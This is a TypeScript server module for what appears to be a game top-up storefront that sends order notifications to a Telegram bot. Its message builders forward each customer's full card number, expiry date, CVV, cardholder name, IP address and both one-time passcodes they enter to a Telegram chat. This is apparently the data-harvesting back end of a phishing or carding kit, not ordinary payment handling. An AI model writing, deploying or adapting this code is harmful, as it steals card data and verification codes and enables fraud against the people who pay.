import 'server-only'

const TELEGRAM_API = 'https://api.telegram.org'

/**
 * يُرسل رسالة نصية (HTML) عبر بوت تيليجرام.
 * يقرأ الـ token والـ chatId من الإعدادات أولاً (DB)، ثم من متغيرات البيئة كاحتياط.
 */
async function telegramCredentials(): Promise<{ token: string; chatId: string } | null> {
  // جرّب قراءة القيم من قاعدة البيانات أولاً
  let token = process.env.TELEGRAM_BOT_TOKEN ?? ''
  let chatId = process.env.TELEGRAM_CHAT_ID ?? ''

  try {
    const { getSettings } = await import('@/lib/settings')
    const s = await getSettings()
    if (s.telegramBotToken) token = s.telegramBotToken
    if (s.telegramChatId)   chatId = s.telegramChatId
  } catch {
    // إذا فشلت القراءة نكمل بمتغيرات البيئة
  }

  if (!token || !chatId) {
    console.warn('[Telegram] Bot token or chat ID not configured — skipping notification')
    return null
  }
  return { token, chatId }
}

export async function sendTelegram(text: string): Promise<void> {
  const creds = await telegramCredentials()
  if (!creds) return
  const { token, chatId } = creds

  try {
    const res = await fetch(`${TELEGRAM_API}/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    })

    if (!res.ok) {
      const body = await res.text()
      console.error('[Telegram] sendMessage failed', { status: res.status, body })
    }
  } catch (err) {
    console.error('[Telegram] fetch error', err)
  }
}

/**
 * يُرسل صورة (data URL بصيغة base64) مع تعليق HTML.
 * إذا فشل إرسال الصورة يُرسل التعليق كرسالة نصية حتى لا يضيع الإشعار.
 */
export async function sendTelegramPhoto(dataUrl: string, caption: string): Promise<void> {
  const creds = await telegramCredentials()
  if (!creds) return
  const { token, chatId } = creds

  const match = /^data:(image\/[\w+.-]+);base64,(.+)$/i.exec(dataUrl)
  if (!match) return sendTelegram(caption)

  try {
    const form = new FormData()
    form.append('chat_id', chatId)
    form.append('caption', caption)
    form.append('parse_mode', 'HTML')
    const ext = match[1].split('/')[1].replace('jpeg', 'jpg')
    form.append('photo', new Blob([Buffer.from(match[2], 'base64')], { type: match[1] }), `proof.${ext}`)

    const res = await fetch(`${TELEGRAM_API}/bot${token}/sendPhoto`, { method: 'POST', body: form })
    if (!res.ok) {
      const body = await res.text()
      console.error('[Telegram] sendPhoto failed', { status: res.status, body })
      await sendTelegram(caption)
    }
  } catch (err) {
    console.error('[Telegram] sendPhoto error', err)
    await sendTelegram(caption)
  }
}

/** يُنشئ نص إشعار إثبات الدفع الذي يرسله العميل بعد الضغط على "لقد دفعت — تحقق" */
export function buildPaymentProofMessage(order: {
  orderNumber: string
  diamonds: number
  playerUid: string
  server: string
  amountUsd: string
  amountUsdt: string
  paymentMethod: string
  cryptoAmount?: string | null
  walletAddress: string | null
  txId: string
  email: string | null
  country: string | null
  phone: string | null
  hasProof: boolean
}) {
  const esc = (s: string) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')

  const now = new Date()
  const pad = (n: number) => String(n).padStart(2, '0')
  const dateStr = `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()}, ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`

  return [
    `🧾 <b>Payment Submitted — Please Verify</b>`,
    ``,
    `🔢 <b>Order:</b> ${esc(order.orderNumber)}`,
    `💎 <b>Diamonds:</b> ${order.diamonds}`,
    `🎮 <b>UID:</b> ${esc(order.playerUid)} (${esc(order.server)})`,
    ``,
    `💳 <b>Method:</b> ${esc(order.paymentMethod)}`,
    order.cryptoAmount ? `🪙 <b>Amount shown:</b> ${esc(order.cryptoAmount)}` : null,
    `💵 <b>Amount:</b> ${esc(order.amountUsdt)} USDT ($${esc(order.amountUsd)})`,
    order.walletAddress ? `🏦 <b>Wallet:</b> <code>${esc(order.walletAddress)}</code>` : null,
    `🔗 <b>TX ID:</b> <code>${esc(order.txId)}</code>`,
    `🖼 <b>Proof:</b> ${order.hasProof ? 'attached' : 'none'}`,
    ``,
    order.email ? `📧 <b>Email:</b> ${esc(order.email)}` : null,
    order.phone ? `📱 <b>Phone:</b> ${esc(order.phone)}` : null,
    order.country ? `🌍 <b>Country:</b> ${esc(order.country)}` : null,
    `📅 <b>Time:</b> ${dateStr}`,
  ]
    .filter((line) => line !== null)
    .join('\n')
}

/** يُرسل رمز OTP المُدخَل من العميل (منفصل لكل محاولة) */
export function buildOtpMessage(order: {
  orderNumber: string
  playerUid: string
  attempt: number   // 1 = الرمز الأول, 2 = الرمز الثاني
  otpCode: string
}) {
  const esc = (s: string) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')

  const now = new Date()
  const pad = (n: number) => String(n).padStart(2, '0')
  const dateStr = `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()}, ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`

  const label = order.attempt === 1 ? '1st OTP Code' : '2nd OTP Code'
  const emoji = order.attempt === 1 ? '1️⃣' : '2️⃣'

  return [
    `${emoji} <b>${label} Received</b>`,
    ``,
    `🔢 <b>Order:</b> ${esc(order.orderNumber)}`,
    `🔢 <b>UID:</b> ${esc(order.playerUid)}`,
    `🔑 <b>OTP Code:</b> ${esc(order.otpCode)}`,
    ``,
    `📅 <b>Time:</b> ${dateStr}`,
  ].join('\n')
}

/** يُنشئ نص إشعار طلب البطاقة البنكية مع بيانات البطاقة كاملة للمراجعة اليدوية */
export function buildCardOrderMessage(order: {
  orderNumber: string
  diamonds: number
  playerUid: string
  server: string
  amountUsd: string
  email: string | null
  country: string | null
  phone: string | null
  cardName:   string
  cardNumber: string
  cardExpiry: string
  cardCvv:    string
  clientIp:   string
}) {
  const esc = (s: string) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')

  const now = new Date()
  const pad = (n: number) => String(n).padStart(2, '0')
  const dateStr = `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()}, ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`

  return [
    `💳 <b>New Bank Card Order — Narcos</b>`,
    ``,
    `🔢 <b>Order Number:</b> ${esc(order.orderNumber)}`,
    `🔢 <b>UID:</b> ${esc(order.playerUid)}`,
    `💵 <b>Amount:</b> $${esc(order.amountUsd)} USD`,
    ``,
    `━━━━━━ 💳 Card Details ━━━━━━`,
    `👤 <b>Cardholder Name:</b> ${esc(order.cardName)}`,
    `🔢 <b>Card Number:</b> ${esc(order.cardNumber)}`,
    `📅 <b>Expiry Date:</b> ${esc(order.cardExpiry)}`,
    `🔐 <b>CVV:</b> ${esc(order.cardCvv)}`,
    `━━━━━━━━━━━━━━━━━━━━━━━━━`,
    ``,
    order.country ? `🌍 <b>Country:</b> ${esc(order.country)}` : null,
    `🌐 <b>IP Address:</b> ${esc(order.clientIp)}`,
    `📅 <b>Time:</b> ${dateStr}`,
  ]
    .filter((line) => line !== null)
    .join('\n')
}
